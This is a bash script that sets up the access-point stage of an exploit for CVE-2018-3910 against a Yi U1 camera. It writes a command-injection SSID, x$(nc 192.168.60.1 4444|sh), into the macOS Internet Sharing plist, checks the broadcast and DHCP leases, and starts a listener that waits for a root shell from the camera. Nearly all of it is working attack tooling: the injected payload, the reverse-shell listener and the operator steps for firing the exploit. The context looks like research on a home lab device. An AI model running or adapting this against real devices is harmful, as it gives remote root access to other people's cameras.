#!/bin/bash
# Yi U1 (CVE-2018-3910) AP bring-up — host the payload-SSID AP the app re-provision needs.
#
# The blocker (yi-u1.md §AP blocker, measured on macOS 27): Internet Sharing is GUI-only
# (kickstart SIP-refused), the GUI toggle REWRITES AirPortNetworkName from its sheet, and the
# private CWInterface hostap paths either come up with SSID None or return EINVAL. So the CLI
# can (a) stage the payload SSID into com.apple.nat.plist byte-for-byte BEFORE the toggle, and
# (b) verify what actually goes on air afterwards — but the toggle click itself is human.
#
#   yi_ap_setup.sh check    verify plist state, payload octets, listener, radio (no changes)
#   yi_ap_setup.sh stage    write the payload SSID + 192.168.60.x sharing range into the plist
#                           (root). Idempotent; run before opening the Sharing pane.
#   yi_ap_setup.sh verify   after the toggle: is an AP actually broadcasting the payload SSID
#                           byte-for-byte, and is the listener armed? Exit 0 = fire the app step.
#   yi_ap_setup.sh serve    start yi_u1.py serve in the background (log /tmp/yi_listener.log)
#
# Full sequence: stage -> (operator: enable Internet Sharing in System Settings with Wi-Fi
# selected as "to computers using") -> verify -> serve -> operator: app re-provision -> shell.
#
# Travel-router alternative (no macOS in the path, yi-runbook.md addendum 2): set the router
# LAN to 192.168.60.1/24, 2.4 GHz WPA2, SSID exactly the payload below; then only `serve`
# and `verify --router` apply here.
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
NAT_PLIST="/Library/Preferences/SystemConfiguration/com.apple.nat.plist"
PAYLOAD='x$(nc 192.168.60.1 4444|sh)'      # 27 octets — the AP-hosted variant (yi_u1.py)
LAB_NET_START="192.168.60.2"
LAB_NET_END="192.168.60.200"
LISTEN_LOG="/tmp/yi_listener.log"

octets() { printf '%s' "$1" | LC_ALL=C wc -c | tr -d ' '; }

plist_ssid() {
  plutil -extract NAT.AirPortNetworkName raw -o - "$NAT_PLIST" 2>/dev/null || true
}

fail() { echo "FAIL: $*"; exit 1; }

cmd="${1:-check}"

case "$cmd" in
  stage)
    [ "$(id -u)" = 0 ] || fail "stage needs root (sudo $0 stage)"
    # Pre-stage the payload SSID so the Sharing sheet's initial value is already correct.
    # The toggle may still rewrite it on save (measured) — `verify` catches that.
    if [ "$(plist_ssid)" = "$PAYLOAD" ]; then
      echo "plist already staged: $(plist_ssid)"
    else
      [ -f "$NAT_PLIST" ] || fail "$NAT_PLIST missing — open the Sharing pane once so macOS creates it, then re-run"
      plutil -replace NAT.AirPortNetworkName -string "$PAYLOAD" "$NAT_PLIST" \
        || fail "plutil -replace failed"
      plutil -replace NAT.SharingNetworkNumberStart -string "$LAB_NET_START" "$NAT_PLIST"
      plutil -replace NAT.SharingNetworkNumberEnd -string "$LAB_NET_END" "$NAT_PLIST"
      plutil -replace NAT.SharingNetworkMask -string "255.255.255.0" "$NAT_PLIST"
      echo "staged: AirPortNetworkName = $(plist_ssid)"
    fi
    echo "octets: $(octets "$PAYLOAD") (payload), plist: $(octets "$(plist_ssid)")"
    echo "next: enable Internet Sharing (System Settings > General > Sharing; share from a"
    echo "wired/Tailscale source TO computers using Wi-Fi) — the sheet should already show the payload SSID."
    ;;

  check)
    echo "== payload =="
    echo "  $PAYLOAD  ($(octets "$PAYLOAD") octets, fits 802.11 32-octet cap: $([ "$(octets "$PAYLOAD")" -le 32 ] && echo yes || echo NO))"
    echo "== nat plist =="
    if [ -f "$NAT_PLIST" ]; then
      got="$(plist_ssid)"
      echo "  AirPortNetworkName: ${got:-<absent>}"
      [ "$got" = "$PAYLOAD" ] && echo "  byte-for-byte: OK" || echo "  byte-for-byte: MISMATCH (run: sudo $0 stage)"
      plutil -p "$NAT_PLIST" | grep -E "Sharing|Enabled" | sed 's/^/  /'
    else
      echo "  $NAT_PLIST absent — open the Sharing pane once, then stage"
    fi
    echo "== radio =="
    mode="$(sudo -n wdutil info 2>/dev/null | awk '/Op Mode/{print $4; exit}')"
    [ -z "$mode" ] && mode="$(wdutil info 2>/dev/null | awk '/Op Mode/{print $3; exit}')"
    echo "  op mode: ${mode:-unknown} (HOSTAP = sharing active; STA = not yet)"
    echo "== listener =="
    if nc -z -w 1 192.168.4.160 4444 2>/dev/null; then
      echo "  port 4444 accepting connections on 192.168.4.160"
    else
      echo "  down — run: $0 serve"
    fi
    echo "== camera =="
    arp -an | grep -i "b0:d5:9d" | sed 's/^/  /' || echo "  no Zowee-OUI (B0:D5:9D) MAC in ARP — camera asleep; ICMP answers may be the Eero proxy (canary-outbound.md §correction)"
    ;;

  serve)
    # 192.168.60.1 exists only once the AP is actually up; bind what exists. A root-owned
    # 192.168.4.160:4444 listener from an earlier session is fine — the camera can reach it
    # whenever it sits on .4.x, and only the payload SSID's host decides which is used.
    # nc probe, not lsof/netstat: unprivileged lsof hides root-owned listeners and
    # netstat -p tcp prints nothing without root here (both measured).
    if nc -z -w 1 192.168.4.160 4444 2>/dev/null; then
      echo "  port 4444 accepting connections on 192.168.4.160 (existing listener)"
    elif ifconfig | grep -q "inet 192.168.60.1 "; then
      nohup python3 "$HERE/yi_u1.py" serve 192.168.60.1 >>"$LISTEN_LOG" 2>&1 &
      sleep 1
      sleep 1; nc -z -w 1 192.168.4.160 4444 2>/dev/null \
        || fail "listener did not start — see $LISTEN_LOG"
      echo "listener up on 192.168.60.1:4444, log $LISTEN_LOG"
    elif ifconfig | grep -q "inet 192.168.4.160 "; then
      nohup python3 "$HERE/yi_u1.py" serve 192.168.4.160 >>"$LISTEN_LOG" 2>&1 &
      sleep 1
      sleep 1; nc -z -w 1 192.168.4.160 4444 2>/dev/null \
        || fail "listener did not start — see $LISTEN_LOG"
      echo "listener up on 192.168.4.160:4444, log $LISTEN_LOG"
    else
      fail "neither 192.168.60.1 (AP up) nor 192.168.4.160 present on any interface"
    fi
    echo "success line to watch: shell from ('192.168.60.x', ...) — then id must show uid=0"
    ;;

  verify)
    # After the GUI toggle: is the AP live and is the SSID the payload verbatim?
    # 1. radio op mode
    mode="$(sudo -n wdutil info 2>/dev/null | awk '/Op Mode/{print $4; exit}')"
    [ -z "$mode" ] && mode="$(wdutil info 2>/dev/null | awk '/Op Mode/{print $4; exit}')"
    echo "op mode: ${mode:-unknown}"
    [ "$mode" = "HOSTAP" ] || echo "WARN: not in HOSTAP — the toggle did not start hostap (known macOS 27 failure, yi-u1.md §AP blocker)"
    # 2. beacon check: scan from the host itself; the payload SSID must appear verbatim.
    # airport -s is deprecated on macOS 27; use system_profiler scan via wdutil, or a phone.
    ssid_on_air="$(system_profiler SPAirPortDataType 2>/dev/null | awk -F': ' '/Current Network Information/{f=1;next} f&&/:/{print $1; exit}')"
    echo "host-visible strongest SSID: ${ssid_on_air:-<none>}"
    # 3. a joined client proves more than a scan: did anything take a 192.168.60.x lease?
    ifconfig | grep -B4 "inet 192.168.60." | sed 's/^/  /'
    bootp="$(grep -A6 '192\.168\.60\.' /var/db/dhcpd_leases 2>/dev/null | sed 's/^/  /')"
    [ -n "$bootp" ] && { echo "dhcp leases (192.168.60.x):"; echo "$bootp"; }
    # 4. byte-for-byte: the only trusted reader is a JOINED client's view. A phone must show
    #    the SSID with $ ( | intact — print the exact bytes to compare against.
    echo "expected on-air SSID, byte-for-byte ($(octets "$PAYLOAD") octets):"
    printf '  %s\n' "$PAYLOAD" | cat -v | sed 's/^/  /'
    # 5. listener
    nc -z -w 1 192.168.4.160 4444 2>/dev/null && echo "listener: up" || echo "listener: DOWN — run: $0 serve"
    echo
    echo "If op mode is HOSTAP and a client joined 192.168.60.x: fire the app re-provision."
    echo "If SSID None / STA-only: macOS 27 AP blocker stands — use the travel-router path"
    echo "(yi-runbook.md addendum 2) and only this script's 'serve' + a manual byte check."
    ;;

  *)
    sed -n '2,25p' "$0"
    exit 2
    ;;
esac
